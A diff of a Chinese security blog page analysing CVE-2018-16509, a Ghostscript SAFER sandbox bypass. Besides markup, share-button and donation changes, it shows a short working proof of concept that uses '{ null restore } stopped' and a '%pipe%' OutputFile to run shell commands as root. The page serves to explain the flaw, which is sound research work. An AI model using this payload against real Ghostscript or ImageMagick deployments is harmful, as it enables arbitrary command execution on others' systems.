@@ -19,7 +19,7 @@
 <meta property="og:description" content="一、背景Ghostscript是Adobe PostScript语言的解释器，能查看以及打印PS、EPS、PDF格式的文件。支持Linux、MacOS、Windows等平台，并且还为ImagineMagic、Python PIL等程序和库所使用。 8月21日，Google安全研究员Tavis Ormandy（@taviso）披露了多个GhostScript的漏洞，在&amp;lt;=9.23的版本中，通构">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/Ghostscript-1.png">
-<meta property="og:updated_time" content="2019-08-22T08:41:20.989Z">
+<meta property="og:updated_time" content="2019-08-22T08:41:20.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CVE-2018-16509：Ghostscrpt沙箱绕过漏洞">
 <meta name="twitter:description" content="一、背景Ghostscript是Adobe PostScript语言的解释器，能查看以及打印PS、EPS、PDF格式的文件。支持Linux、MacOS、Windows等平台，并且还为ImagineMagic、Python PIL等程序和库所使用。 8月21日，Google安全研究员Tavis Ormandy（@taviso）披露了多个GhostScript的漏洞，在&amp;lt;=9.23的版本中，通构">
@@ -217,7 +217,7 @@
 <p>这里我们在#2处下断，观察到了解释器处理stopped、null、restore等关键字的过程，至此SAFER沙箱如何被绕的过程就逐渐清晰了。<br><img src="https://image.3001.net/images/20180824/1535102928_5b7fcfd0d7ab5.png" alt="绕过SAFER沙箱过程"></p>
 <p><img src="https://image.3001.net/images/20180824/1535102953_5b7fcfe9273b2.png" alt="绕过SAFER沙箱过程"></p>
 <p><img src="https://image.3001.net/images/20180824/1535103001_5b7fd01996188.png" alt="绕过SAFER沙箱过程"></p>
-<h3 id="2-4-探究漏洞成因"><a href="#2-4-探究漏洞成因" class="headerlink" title="2.4 探究漏洞成因"></a>2.4 探究漏洞成因</h3><p>完整过程如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span><span class="hljs-bash"> gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null </span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">legal</span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">&#123; null restore &#125; stopped &#123; pop &#125; <span class="hljs-keyword">if</span></span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">legal</span></span><br><span class="line"><span class="hljs-meta">GS&gt;</span><span class="hljs-bash">mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span></span><br><span class="line">GS&lt;1&gt;showpage</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-4-探究漏洞成因"><a href="#2-4-探究漏洞成因" class="headerlink" title="2.4 探究漏洞成因"></a>2.4 探究漏洞成因</h3><p>完整过程如下：<br><figure class="highlight shell hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">$</span> gs -q -sDEVICE=ppmraw -dSAFER -sOutputFile=/dev/null </span><br><span class="line"><span class="hljs-meta">GS&gt;</span>legal</span><br><span class="line"><span class="hljs-meta">GS&gt;</span>&#123; null restore &#125; stopped &#123; pop &#125; if</span><br><span class="line"><span class="hljs-meta">GS&gt;</span>legal</span><br><span class="line"><span class="hljs-meta">GS&gt;</span>mark /OutputFile (%pipe%id) currentdevice putdeviceprops</span><br><span class="line">GS&lt;1&gt;showpage</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure></p>
 <p>经过上面的分析我们可以知道简单的一条<code>{null restore} stopped {pop} if</code>就能绕过SAFER沙箱，但其原理又是什么呢？</p>
 <p>PostScript是一种“逆波兰式”（Reverse Polish Notation，也称为后缀表达式）的语言。简单来说就是操作数在前，操作符在后。PoC中这条语句是一条典型的PostScript异常处理语句，stopped操作符用于PostScript的异常处理，也就是说stopped执行前面的{}中给出的过程，如果解释器在执行该过程期间出现错误，它将终止该过程并执行stopped操作符之后{}中的过程。</p>
 <p><code>null restore</code>会引起类型检查错误（/typecheck error），同时restore的执行导致LockSafetyParams设置为False，stopped捕获到异常，弹出栈顶元素null，GS继续运行，但此时LockSafetyParams的值还没恢复为True。<br><img src="https://image.3001.net/images/20180824/1535103061_5b7fd05552e72.png" alt></p>
@@ -253,27 +253,63 @@
         
         
         
+        <!-- AddToAny BEGIN -->
+<div class="a2a_kit a2a_kit_size_32 a2a_default_style">
+<a class="a2a_dd" href="https://www.addtoany.com/share"></a>
+<!-- <a class="a2a_button_facebook"></a> -->
+<a class="a2a_button_wechat"></a>
+<a class="a2a_button_twitter"></a>
+<!-- <a class="a2a_button_telegram"></a> -->
+<a class="a2a_button_whatsapp"></a>
+<a class="a2a_button_reddit"></a>
+</div>
+<script async src="https://static.addtoany.com/menu/page.js"></script>
+<!-- AddToAny END -->
+
+        
     </div>
 </div>
 
 
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3>
+        <div class="buttons is-centered">
+            
+                
+<a class="button is-info donate">
+    <span class="icon is-small">
+        <i class="fab fa-alipay"></i>
+    </span>
+    <span>支付宝</span>
+    <div class="qrcode"><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190822175230.jpg" alt="支付宝"></div>
+</a>
+
+                
+                
+<a class="button is-success donate">
+    <span class="icon is-small">
+        <i class="fab fa-weixin"></i>
+    </span>
+    <span>微信</span>
+    <div class="qrcode"><img src="https://raw.githubusercontent.com/JonTsang/Figurebed/master/img/20190822175230.jpg" alt="微信"></div>
+</a>
+
+                
+        </div>
+    </div>
+</div>
 
 
 
 <div class="card card-transparent">
     <div class="level post-navigation is-flex-wrap is-mobile">
         
-        <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2019/07/03/hello-world/">
-                <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">Hello World</span>
-            </a>
-        </div>
-        
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2018/11/16/Bypassing Canary——SSP Leak/">
-                <span class="level-item">Bypassing Canary——SSP Leak</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/2019/07/03/hello-world/">
+                <span class="level-item">Hello World</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
